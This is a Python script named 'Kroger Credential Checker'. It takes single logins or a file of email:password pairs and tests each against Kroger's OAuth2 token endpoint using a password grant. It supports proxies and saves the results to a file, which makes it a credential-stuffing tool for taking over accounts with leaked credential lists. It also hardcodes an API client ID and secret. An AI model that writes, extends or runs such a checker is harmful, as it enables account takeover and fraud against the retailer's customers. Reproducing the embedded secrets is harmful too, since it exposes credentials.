import requests
import json
from requests.auth import HTTPBasicAuth
import argparse
import sys
from datetime import datetime

# Kroger API credentials
CLIENT_ID = "cartgenie-42a6b98e3c54f5b92092edf53fe6ea7c8103340637182546648"
CLIENT_SECRET = "nciRwpkzfWQT_ifv9Tg6tI258lxbZ2mdi6xbEzSq"

def get_proxy():
    """Optional proxy configuration - modify if needed"""
    # Example: return {'http': 'http://proxy.example.com:8080', 'https': 'http://proxy.example.com:8080'}
    return None

def get_access_token(proxy=None):
    """Get access token using client credentials"""
    url = "https://api.kroger.com/v1/connect/oauth2/token"
    auth = HTTPBasicAuth(CLIENT_ID, CLIENT_SECRET)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "KrogerCredChecker/1.0"
    }
    data = {
        "grant_type": "client_credentials",
        "scope": "profile.compact"
    }
    
    try:
        response = requests.post(
            url, 
            auth=auth, 
            headers=headers, 
            data=data, 
            proxies=proxy,
            timeout=10
        )
        response.raise_for_status()
        return response.json().get("access_token")
    except Exception as e:
        print(f"Error getting access token: {str(e)}")
        return None

def check_credential(email, password, proxy=None):
    """Check if a Kroger credential is valid using OAuth2 password grant"""
    url = "https://api.kroger.com/v1/connect/oauth2/token"
    auth = HTTPBasicAuth(CLIENT_ID, CLIENT_SECRET)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "KrogerCredChecker/1.0"
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "profile.compact"
    }
    
    try:
        response = requests.post(
            url, 
            auth=auth, 
            headers=headers, 
            data=data, 
            proxies=proxy,
            timeout=10
        )
        
        if response.status_code == 200:
            return True, "Valid credential"
        elif response.status_code == 400:
            error = response.json().get("error_description", "Invalid credentials")
            return False, error
        else:
            return False, f"API Error: HTTP {response.status_code}"
    except Exception as e:
        return False, f"Connection Error: {str(e)}"

def main():
    parser = argparse.ArgumentParser(description="Kroger Credential Checker")
    parser.add_argument("-e", "--email", help="Single email to check")
    parser.add_argument("-p", "--password", help="Password for single email")
    parser.add_argument("-f", "--file", help="File containing credentials (email:password format)")
    args = parser.parse_args()
    
    if not any([args.email, args.file]):
        parser.print_help()
        sys.exit(1)
    
    # Get proxy
    proxy = get_proxy()
    print(f"Using proxy: {proxy}")
    
    # Get access token to verify API connectivity
    token = get_access_token(proxy)
    if not token:
        print("Failed to get initial access token. API may be down or credentials invalid.")
        sys.exit(1)
    
    results = []
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = f"kroger_results_{timestamp}.txt"
    
    if args.email and args.password:
        # Check single credential
        is_valid, message = check_credential(args.email, args.password, proxy)
        result = f"{args.email}:{args.password} - {message}"
        print(result)
        results.append(result)
    elif args.file:
        # Check multiple credentials from file
        try:
            with open(args.file, 'r') as f:
                credentials = [line.strip() for line in f if line.strip()]
                
            for cred in credentials:
                if ":" not in cred:
                    print(f"Skipping malformed credential: {cred}")
                    continue
                    
                email, password = cred.split(":", 1)
                is_valid, message = check_credential(email, password, proxy)
                result = f"{email}:{password} - {message}"
                print(result)
                results.append(result)
        except Exception as e:
            print(f"Error reading file: {str(e)}")
            sys.exit(1)
    
    # Save results
    with open(output_file, 'w') as f:
        f.write("\n".join(results))
    print(f"\nResults saved to {output_file}")

if __name__ == "__main__":
    main()